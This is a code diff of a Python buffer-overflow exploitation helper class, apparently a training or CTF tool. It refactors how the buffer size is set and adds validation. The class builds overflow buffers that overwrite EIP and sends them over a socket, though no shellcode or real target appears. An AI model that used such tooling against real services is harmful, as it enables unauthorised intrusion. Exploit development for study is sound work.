@@ -11,7 +11,7 @@ PLACEHOLDER_EIP = "BBBB"
 
 
 class Buff:
-    def __init__(self, target: (str, int), buffer_size: int, prefix: str, postfix: str = ""):
+    def __init__(self, target: (str, int), prefix: str, postfix: str = ""):
         # Custom exploitation methods
         self.sender = sender.send_socket
         self.fuzzer = fuzzer.fuzz
@@ -27,7 +27,7 @@ class Buff:
         self.postfix = postfix
 
         # Total Buffer Size
-        self.buffer_size = buffer_size
+        self.buffer_size = None
 
         # EIP Address
         self.eip_offset = None
@@ -58,6 +58,11 @@ class Buff:
     def setPostfix(self, postfix: str) -> None:
         self.postfix = postfix
 
+    def setBufferSize(self, buffer_size: int) -> None:
+        if buffer_size <= 0:
+            raise Exception("Buffer size must be greater than 0")
+        self.buffer_size = buffer_size
+
     def setEipAddress(self, eip: str) -> None:
         if len(eip) != 4:
             raise Exception("EIP address length must be in 4")
@@ -87,8 +92,13 @@ class Buff:
         PREFIX + BUFFERS + EIP + BAD CHARACTERS + POSTFIeipX
         """
 
+        # check EIP
         if self.eip_offset is None:
             raise Exception("EIP offset is not set")
+
+        # check Buffer Size
+        if self.buffer_size is None:
+            raise Exception("Buffer size is not set")
 
         buffer = "A" * self.eip_offset
         buffer += fake_eip # fake EIP to overflow address
@@ -118,6 +128,10 @@ class Buff:
 
         if self.eip_address == PLACEHOLDER_EIP:
             print(f"Warning: your EIP is a placeholder, {self.eip_address}. Are you sure you have set the correct return address")
+
+        # check Buffer Size
+        if self.buffer_size is None:
+            raise Exception("Buffer size is not set")
 
         # check Exploit
         if self.exploit is None:
